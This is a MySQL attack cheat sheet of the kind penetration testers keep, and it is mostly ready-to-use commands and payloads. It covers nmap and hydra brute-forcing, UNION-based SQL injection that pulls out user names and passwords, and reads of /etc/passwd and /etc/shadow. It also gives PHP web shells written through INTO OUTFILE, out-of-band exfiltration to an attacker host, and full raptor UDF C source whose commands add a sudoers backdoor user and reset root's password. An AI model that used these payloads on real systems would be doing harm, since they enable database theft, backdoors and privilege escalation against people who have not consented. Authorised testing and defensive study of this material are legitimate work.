`` Scanning

    ~$ nmap VAR_TARGET_HOST -p 3306 -sV -Pn -vv --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables

`` Password Bruteforcing

    ~$ hydra -V -t 4 -w 50 -s 22 -f -l root -e nsr -P VAR_WORDLIST mysql://VAR_TARGET_HOST

`` Dump

    ~$ mysqldump -h VAR_TARGET_HOST -u root -p --single-transaction --quick --lock-tables=false > dump.sql

`` Structure

    `` Version

        SELECT version();
        SHOW variables like "%version%";
        1 UNION ALL SELECT 1,2,3,@@version,5
        1' UNION SELECT version(),2#

    `` Current user

        SELECT user();
        1 UNION ALL SELECT 1,2,3,user(),5

    `` Current user and database

        0' or 1=1 UNION SELECT user(),database() #

    `` All tables

        1 UNION ALL SELECT 1,2,3,table_name,5 FROM information_schema.tables
        0' or 0=0 UNION SELECT table_schema, table_name from information_schema.tables #
        1' UNION ALL SELECT table_name,2 from information_schema.tables#

    `` Column names

        1 UNION ALL SELECT 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'

    `` Tables and columns

        0' or 0=0 UNION SELECT 1,concat(table_name,char(58),column_name) from information_schema.columns #

    `` Row for output

        1 UNION ALL SELECT 1,2,3,4,5,6,7,8

    `` User names and passwords

        1 UNION ALL SELECT 1,2,3,concat(name, 0x3A, password),5 from users
        1' UNION ALL SELECT concat(user,char(58),password),2 from users#
        0' or 0=0 UNION SELECT user, password from database.users #

        1' ORDER BY 10#
        1' ORDER BY 10 --
        1' UNION ALL SELECT column_name,2 from information_schema.columns where table_name = "users"#

        id=-1 union select null,null,null,load_file('/etc/passwd'),null,null,null,null
        id=-1 union select 0x2044,2,3,4,5,6,7,8 into outfile '/var/www/html/test.txt'

`` Hacks

    DROP sampletable;--
    DROP sampletable;#
    DR/**/OP/*bypass blacklisting*/sampletable
    SELECT /*!32302 1/0, */ 1 FROM tablename
    SELECT IF(1=1,'true','false')
    SELECT 0x5045  # this is not an integer it will be a string from Hex
    SELECT 0x50 + 0x45  # this is integer now!
    SELECT CONCAT(login, password) FROM members
    SELECT CONCAT('0x',HEX('c:\\boot.ini'))
    SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))
    SELECT LOAD_FILE(0x633A5C626F6F742E696E69)  # c:\boot.ini
    SELECT ASCII('a')
    SELECT CHAR(64)
    '; INSERT INTO users VALUES( 1, 'username', 'password', 9 )/*
    INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)

    `` Second Order SQL Injections

        Basically, you put an SQL Injection to some place and expect it's unfiltered in another action. This is common hidden layer problem.
        If application is using name field in an unsafe stored procedure or function, process etc. then it will insert first users password as your name etc.

        Name: ' + (SELECT TOP 1 password FROM users ) + '

    `` Extension upload

        SELECT @@plugin_dir;

        SELECT 0x7f454c...00000 into dumpfile "/var/lib/mysql/udf.so";

        CREATE function sys_eval returns string soname 'udf.so';
        SELECT * from mysql.func where name = 'sys_eval';
        SELECT sys_eval('dir');
        DROP function sys_eval;

        echo '<?php $sock=fsock[...]$pipes); ?>' | xxd -ps | tr -d '\n'

    `` Filesystem

        SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'
        SELECT load_file('/etc/shadow');
        SELECT 'system($_get["c"]); ?>' into outfile '/var/www/html/shell.php';
        SELECT 'test' into outfile '/etc/test.1';
        SELECT load_file('\\\\VAR_TARGET_HOST\\aa');
        2 UNION ALL SELECT 1,2,3,4,5,load_file('\\VAR_TARGET_HOST\')
        SELECT load_file(0x5c5c5c5c3139322e3136382e302e3130315c5c6161);
        SELECT 'netspi' into dumpfile '\\\\VAR_TARGET_HOST\\aa';
        SELECT 'netspi' into outfile '\\\\VAR_TARGET_HOST\\aa';
        LOAD data infile '\\\\VAR_TARGET_HOST\\aa' into table database.table_name;
        1 UNION ALL SELECT 1,2,3,"content",5 into OUTFILE 'outfile'

        UNION ALL SELECT 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
        UNION ALL SELECT 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
        mysql> SELECT LOAD_FILE('/etc/passwd');

        CREATE TABLE foo( line blob );
        LOAD DATA INFILE 'c:/boot.ini' INTO TABLE foo;
        SELECT * FROM foo;

        sudo python2 /usr/share/doc/python-impacket/examples/smbserver.py TEST .
        http://VAR_TARGET_HOST:8080/something.do?mode=6) union select 1,2,3,4,5,6,7,8,load_file("\\\\VAR_TARGET_HOST\\TEST\\test.ear"),10,11,12,13,14,15,16,17,18,19,1 into dumpfile 'C:\\Application\\Directory\\server\\default\\tmp\\deploy\\test.ear'/*
        http://VAR_TARGET_HOST:8080/GenericBackdoor/GenericBackdoor/

    `` Time-base blind

        IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))
        IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))
        SELECT sleep(10);

        select benchmark( 500000, sha1( 'test' ) );
        query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
        select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );

    `` Out of Band Channel Attacks

        # Makes a NBNS query request/DNS resolution request to yourhost.com
        ?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'yourhost.com\\')))

        # Writes data to your shared folder/file
        ?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt')

    `` raptor.c

        #include <stdio.h>
        #include <stdlib.h>

        enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

        typedef struct st_udf_args {
            unsigned int arg_count; // number of arguments
            enum Item_result *arg_type; // pointer to item_result
            char **args; // pointer to arguments
            unsigned long *lengths; // length of string args
            char *maybe_null; // 1 for maybe_null args
        } UDF_ARGS;

        typedef struct st_udf_init {
            char maybe_null; // 1 if func can return NULL
            unsigned int decimals; // for real functions
            unsigned long max_length; // for string functions
            char *ptr; // free ptr for func data
            char const_item; // 0 if result is constant
        } UDF_INIT;

        int do_cmd(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
        {
        if (args->arg_count != 1)
            return(0);
            system(args->args[0]);
            return(0);
        }

        char do_cmd_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
        {
            return(0);
        }


        $ gcc -fPIC -g -c raptor.c
        $ gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc
        $ xxd -p -c `stat --format="%s" raptor.so` raptor.so

        mysql> SELECT '<output of above command>' INTO DUMPFILE '/usr/lib/mysql/plugin/raptor.so'
        mysql> CREATE function do_cmd returns integer soname "raptor.so";
        mysql> SELECT do_cmd("echo 'root:root'|chpasswd");


        gcc -g -c raptor_udf2.c
        gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
        mysql -u root
        mysql> use mysql;
        mysql> create table foo(line blob);
        mysql> insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
        mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
        mysql> create function do_system returns integer soname 'raptor_udf2.so';
        mysql> select * from mysql.func;
        +-----------+-----+----------------+----------+
        | name      | ret | dl             | type     |
        +-----------+-----+----------------+----------+
        | do_system |   2 | raptor_udf2-2.so | function |
        +-----------+-----+----------------+----------+
        mysql> select do_system('adduser toor');
        mysql> select do_system('echo "toor    ALL=(ALL) ALL" >> /etc/sudoers');
        mysql> select do_system('echo "toor:toor" | /usr/sbin/chpasswd');

`` Notes

    MySQL don't have permissions to overwrite an exsisting file, make sure you go with new filename every single time with outfile.

`` Extra

    -- Source: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

    - Version     SELECT @@version
    - Comments    SELECT 1; #comment
    - SELECT /*comment*/1;
    - Current User    SELECT user();
    - SELECT system_user();
    - List Users  SELECT user FROM mysql.user; — priv
    - List Password Hashes    SELECT host, user, password FROM mysql.user; — priv
    - Password Cracker    John the Ripper will crack MySQL password hashes.
    - List Privileges     SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; — list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; — priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; — list privs on columns
    - List DBA Accounts   SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv
    - Current Database    SELECT database()
    - List Databases  SELECT schema_name FROM information_schema.schemata; — for MySQL >= v5.0
    - SELECT distinct(db) FROM mysql.db — priv
    - List Columns    SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
    - List Tables     SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
    - Find Tables From Column Name    SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’
    - Select Nth Row  SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0
    - SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0
    - Select Nth Char     SELECT substr(‘abcd’, 3, 1); # returns c
    - Bitwise AND     SELECT 6 & 2; # returns 2
    - SELECT 6 & 1; # returns 0
    - ASCII Value -> Char     SELECT char(65); # returns A
    - Char -> ASCII Value     SELECT ascii(‘A’); # returns 65
    - Casting     SELECT cast(’1′ AS unsigned integer);
    - SELECT cast(’123′ AS char);
    - String Concatenation    SELECT CONCAT(‘A’,'B’); #returns AB
    - SELECT CONCAT(‘A’,'B’,'C’); # returns ABC
    - If Statement    SELECT if(1=1,’foo’,'bar’); — returns ‘foo’
    - Case Statement  SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A
    - Avoiding Quotes     SELECT 0×414243; # returns ABC
    - Time Delay  SELECT BENCHMARK(1000000,MD5(‘A’));
    - SELECT SLEEP(5); # >= 5.0.12
    - Make DNS Requests   Impossible?
    - Command Execution   If mysqld (<5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  raptor_udf.c explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.
    - Local File Access   …’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) — priv, can only read world-readable files.
    - SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system
    - Hostname, IP Address    SELECT @@hostname;
    - Create Users    CREATE USER test1 IDENTIFIED BY ‘pass1′; — priv
    - Delete Users    DROP USER test1; — priv
    - Make User DBA   GRANT ALL PRIVILEGES ON *.* TO test1@’%'; — priv
    - Location of DB files    SELECT @@datadir;
    - Default/System Databases    information_schema (>= mysql 5.0)
    - mysql
